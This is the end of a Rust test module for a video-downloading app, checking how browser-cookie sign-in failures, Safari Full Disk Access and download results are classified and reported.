        for refused in [FetchFailure::CookiesNotAccepted, FetchFailure::LoginRequired] {
            let probe = CookieProbe::Failed(refused.clone());
            assert_eq!(probe.verdict(), CookieCheck::Refused, "{refused:?}");
            assert_eq!(probe.message(), refused.to_string());
            assert!(!probe.verdict().ok());
        }

        // Never read. The verdict is what lets a row offer another browser instead of telling
        // somebody to sign in again for no reason.
        for unreadable in [
            FetchFailure::BrowserCookiesUnreadable,
            FetchFailure::CookiesFileUnreadable,
            FetchFailure::SafariNeedsFullDiskAccess,
            FetchFailure::BrowserKeychainRefused,
        ] {
            let probe = CookieProbe::Failed(unreadable.clone());
            assert_eq!(probe.verdict(), CookieCheck::Unreadable, "{unreadable:?}");
            assert_eq!(probe.message(), unreadable.to_string());
        }

        // Nothing to do with the cookies, and not blamed on them.
        for other in [
            FetchFailure::NotInstalled,
            FetchFailure::NoJsRuntime,
            FetchFailure::Network,
            FetchFailure::Removed,
        ] {
            assert_eq!(CookieProbe::Failed(other.clone()).verdict(), CookieCheck::Inconclusive);
        }
        assert_eq!(CookieProbe::TimedOut.verdict(), CookieCheck::Inconclusive);
        let timed_out = CookieProbe::TimedOut.message();
        assert!(timed_out.contains(&COOKIE_TEST_TIMEOUT_SECS.to_string()), "{timed_out}");
        assert!(timed_out.contains("proved nothing"), "{timed_out}");

        // The verdicts cross a serialisation boundary, so their spelling is part of the contract.
        let names: Vec<String> = [
            CookieCheck::Working,
            CookieCheck::Unreadable,
            CookieCheck::Refused,
            CookieCheck::Inconclusive,
            CookieCheck::NotConfigured,
        ]
        .iter()
        .map(|v| serde_json::to_string(v).expect("a verdict serialises"))
        .collect();
        assert_eq!(
            names,
            [
                "\"working\"",
                "\"unreadable\"",
                "\"refused\"",
                "\"inconclusive\"",
                "\"not_configured\""
            ]
        );
        assert!(!CookieCheck::NotConfigured.ok(), "no sign-in is not a working sign-in");
    }

    /// The Safari permission question, answered locally: an `open`, a `drop`, and no probe.
    ///
    /// Measured on the Mac this feature comes from: `stat` on
    /// `~/Library/Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies` succeeds
    /// (345,981 bytes, written minutes ago) while `open` on the same path raises `[Errno 1]
    /// Operation not permitted`. That error *is* the answer, so the app no longer spends up to
    /// `COOKIE_TEST_TIMEOUT_SECS` on a network probe to be told the same thing.
    #[test]
    fn the_safari_permission_question_is_answered_by_an_open_and_never_by_a_probe() {
        use SafariCookieAccess::*;

        // The mapping, which is the whole judgement, without needing a Mac to make it. `EPERM` is
        // what macOS returns for a refused Full Disk Access, and Rust spells it `PermissionDenied`.
        assert_eq!(SafariCookieAccess::from_open_error(None), Readable);
        assert_eq!(
            SafariCookieAccess::from_open_error(Some(std::io::ErrorKind::PermissionDenied)),
            NeedsFullDiskAccess
        );
        assert_eq!(
            SafariCookieAccess::from_open_error(Some(std::io::ErrorKind::NotFound)),
            NoCookieStore
        );
        assert_eq!(
            SafariCookieAccess::from_open_error(Some(std::io::ErrorKind::InvalidData)),
            Unreadable
        );

        // Only an openable jar leaves the probe anything left to learn; every other outcome is a
        // verdict on its own, which is what lets the check answer instantly.
        assert_eq!(Readable.verdict(), None);
        assert!(Readable.ok());
        for refused in [NeedsFullDiskAccess, NoCookieStore, Unreadable] {
            assert_eq!(refused.verdict(), Some(CookieCheck::Unreadable), "{refused:?}");
            assert!(!refused.ok(), "{refused:?}");
        }

        // Each case says what a failed row would have said for the same cause, so one thing is
        // never explained two ways.
        assert_eq!(
            NeedsFullDiskAccess.message(),
            FetchFailure::SafariNeedsFullDiskAccess.to_string()
        );
        assert_eq!(Unreadable.message(), FetchFailure::BrowserCookiesUnreadable.to_string());
        assert_eq!(NoCookieStore.message(), SAFARI_HAS_NO_COOKIE_STORE);
        assert!(
            !SAFARI_HAS_NO_COOKIE_STORE.contains("Full Disk Access"),
            "an empty Safari is not a permission problem: {SAFARI_HAS_NO_COOKIE_STORE}"
        );
        assert_eq!(Readable.message(), SAFARI_COOKIES_READABLE);
        assert!(
            SAFARI_COOKIES_READABLE.contains("Nothing was read out of the file"),
            "{SAFARI_COOKIES_READABLE}"
        );

        // And against a real filesystem. The verdict is a unit enum, so there is nowhere for a
        // cookie to travel even if one had been read - and the bytes are still all there
        // afterwards, because the handle was dropped without a single read.
        let dir = std::env::temp_dir().join(format!("cc-safari-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("mkdir");
        let jar = dir.join("Cookies.binarycookies");
        let bytes = b"cook\x00not-a-real-token";
        std::fs::write(&jar, bytes).expect("write a jar that is not anybody's");
        assert_eq!(safari_cookie_access(&jar), Readable);
        assert_eq!(
            std::fs::read(&jar).expect("the jar is still there").len(),
            bytes.len(),
            "the check opens and drops: it neither reads nor writes a byte"
        );
        assert_eq!(safari_cookie_access(&dir.join("nothing-here")), NoCookieStore);
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// What the check is *run against*, and what it may not do while running.
    ///
    /// A check that probed a members-only video, or an age-restricted one, would report every
    /// user's perfectly good cookies as broken; a check that asked for verbosity could print one.
    #[test]
    fn the_sign_in_check_probes_a_public_video_and_never_asks_for_verbosity() {
        let link = parse(COOKIE_TEST_URL).expect("the test URL is a link this app accepts");
        assert_eq!(link.site(), LinkSite::YouTube);
        assert_eq!(link.url(), COOKIE_TEST_URL);
        assert!(COOKIE_TEST_URL.starts_with("https://"), "{COOKIE_TEST_URL}");

        // The command line is the probe's, so the check cannot drift from the fetch it predicts.
        let cookies = CookieFlag::Browser("chrome");
        let args = probe_args(&link, None, Some(&cookies));
        assert!(args.contains(&"--skip-download".to_string()), "{args:?}");
        assert_eq!(args.last().map(String::as_str), Some(COOKIE_TEST_URL), "{args:?}");
        assert_eq!(args[args.len() - 2], "--", "the URL can never be read as a flag: {args:?}");
        assert!(
            !args.iter().any(|a| matches!(a.as_str(), "-v" | "--verbose")),
            "verbosity is the only channel that prints cookie values: {args:?}"
        );
        // Short enough that somebody is still watching when the answer arrives.
        assert!((5..=30).contains(&COOKIE_TEST_TIMEOUT_SECS), "{COOKIE_TEST_TIMEOUT_SECS}");
    }

    #[test]
    fn the_finished_download_is_found_and_the_fragments_are_not() {
        let dir = std::env::temp_dir().join(format!("cc-link-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("mkdir");
        assert_eq!(downloaded_file(&dir), None, "an empty scratch has no result");

        std::fs::write(dir.join("source.f137.mp4"), b"fragment").expect("write");
        std::fs::write(dir.join("source.mp4.part"), b"partial").expect("write");
        assert_eq!(downloaded_file(&dir), None, "a fragment is not a result");

        std::fs::write(dir.join("source.mp4"), b"the finished file").expect("write");
        assert_eq!(downloaded_file(&dir), Some(dir.join("source.mp4")));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_row_says_where_it_came_from_and_what_it_is_becoming() {
        let link = parse("https://www.bilibili.com/video/BV1GJ411x7h7").expect("a link");
        assert_eq!(link_summary(&link, by_id("mp3").expect("mp3")), "Bilibili → MP3");
        let yt = parse("https://youtu.be/abc").expect("a link");
        assert_eq!(link_summary(&yt, by_id("mp4").expect("mp4")), "YouTube → MP4");
    }
}
